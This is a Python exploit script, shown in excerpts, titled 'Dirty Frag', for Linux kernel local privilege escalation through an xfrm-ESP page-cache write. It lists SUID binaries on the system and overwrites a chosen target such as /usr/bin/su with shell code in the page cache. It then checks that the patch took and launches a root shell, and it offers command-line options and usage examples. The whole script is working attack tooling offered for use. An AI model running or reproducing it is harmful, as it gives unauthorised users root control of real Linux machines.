...
Modified: Custom target SUID binary support
"""
...
def check_suid_binary(path):
    """Check if a binary exists and has SUID bit set"""
    try:
        if not os.path.exists(path):
            return (False, "not found")
        stat_info = os.stat(path)
        if stat_info.st_mode & 0o4000:  # SUID bit
            return (True, f"SUID (owner: {stat_info.st_uid})")
        else:
            return (False, f"no SUID (perms: {oct(stat_info.st_mode)[-3:]})")
    except OSError as e:
        return (False, f"error: {e}")

def list_suid_binaries():
    """List all SUID binaries from common locations and system scan"""
    print("\n[*] Scanning for SUID binaries...\n")
    
    found_bins = []
    
    # Check common binaries first
    for bin_path in COMMON_SUID_BINS:
        is_suid, info = check_suid_binary(bin_path)
        if is_suid:
            found_bins.append((bin_path, info))
    
    # Also scan common directories
    scan_dirs = ["/bin", "/usr/bin", "/sbin", "/usr/sbin", "/usr/local/bin"]
                ...
                if os.path.isfile(full_path) and os.access(full_path, os.X_OK):
                    try:
                        if os.stat(full_path).st_mode & 0o4000:
                            if full_path not in [b[0] for b in found_bins]:
                                found_bins.append((full_path, "SUID"))
                    except OSError:
                        pass
    
    if found_bins:
        print(f"Found {len(found_bins)} SUID binaries:\n")
        for path, info in found_bins:
            print(f"  ✓ {path} [{info}]")
    else:
...
def _corrupt_binary(target_bin):
    LOG("Targeting binary: %s", target_bin)
    
    # Verify target exists and is SUID
    is_suid, info = check_suid_binary(target_bin)
    if not is_suid:
        WARN("Target %s is not SUID or does not exist! %s", target_bin, info)
        return False
    
    LOG("Target verified: %s", info)
...
def binary_patched(target_bin, marker_bytes):
    try:
        fd = os.open(target_bin, os.O_RDONLY)
        got = os.pread(fd, 8, ENTRY_OFFSET)
        os.close(fd)
        return got == marker_bytes
    except OSError:
        return False

def lpe_main(target_bin):
    pid = os.fork()
    if pid == 0:
        os._exit(0 if _corrupt_binary(target_bin) else 2)
...
def main():
    ...
    parser = argparse.ArgumentParser(
        description='Dirty Frag - Linux Kernel LPE (xfrm-ESP Page-Cache Write)',
        epilog='Examples:\n  python3 df_custom.py -l\n  python3 df_custom.py -t /usr/bin/su\n  python3 df_custom.py -t /usr/bin/passwd -v',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('-l', '--list-suid', action='store_true', 
                        help='List all SUID binaries on the system')
    parser.add_argument('-t', '--target', type=str, metavar='PATH',
                        help='Target SUID binary to exploit (e.g., /usr/bin/su)')
    ...
    if not args.target:
        parser.print_help()
        print("\n[-] Error: Please specify target with -t or list SUIDs with -l")
        sys.exit(1)
    
    target_path = args.target
    
    if os.getuid() == 0:
        LOG("Already root! Dropping to shell...")
        os.execvp("/bin/bash", ["bash"])
    
    LOG("Running ESP variant against %s ...", target_path)
    
    # Verify target exists and is SUID before attempting exploit
    is_suid, info = check_suid_binary(target_path)
    if not is_suid:
        WARN("Target %s is not a valid SUID binary! (%s)", target_path, info)
        sys.exit(1)
    
    LOG("Target verified: %s", info)
    
    if not lpe_main(target_path):
        WARN("Exploit failed - kernel may be patched or target not writable")
        sys.exit(1)
    
    # Check if binary was patched (use simple marker check)
    try:
        with open(target_path, 'rb') as f:
            f.seek(ENTRY_OFFSET)
            marker = f.read(8)
            if marker == SHELL_ELF[ENTRY_OFFSET:ENTRY_OFFSET+8]:
                LOG("Binary successfully patched! Launching root shell...")
                _run_pty()
                return
    except Exception as e:
        DBG("Patch verification failed: %s", e)
